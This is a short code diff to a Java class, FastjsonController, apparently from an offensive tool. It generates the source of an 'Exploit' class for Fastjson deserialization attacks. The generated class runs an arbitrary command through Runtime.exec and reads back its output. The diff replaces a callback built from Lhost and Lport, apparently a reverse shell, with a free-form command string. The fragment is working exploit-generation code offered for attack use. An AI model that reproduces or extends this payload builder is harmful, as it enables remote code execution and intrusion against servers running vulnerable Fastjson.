@@ -10,14 +10,14 @@ import com.swordHostDemo.utls.enCodeUtls;
 public class FastjsonController {
 
 
-    public static String fastjsonEXP1(String Lhost, String Lport){
+    public static String fastjsonEXP1(String inputString){
         String str = "import java.io.BufferedReader;\n" +
                 "import java.io.InputStream;\n" +
                 "import java.io.InputStreamReader;\n" +
                 "\n" +
                 "public class Exploit{\n" +
                 "    public Exploit() throws Exception {\n" +
-                "        Process p = Runtime.getRuntime().exec(new String[]{\""+ enCodeUtls.JavaEncode(Lhost,Lport)+"\"});\n"+
+                "        Process p = Runtime.getRuntime().exec(new String[]{\""+inputString+"\"});\n"+
                 "        InputStream is = p.getInputStream();\n" +
                 "        BufferedReader reader = new BufferedReader(new InputStreamReader(is));\n" +
                 "\n" +
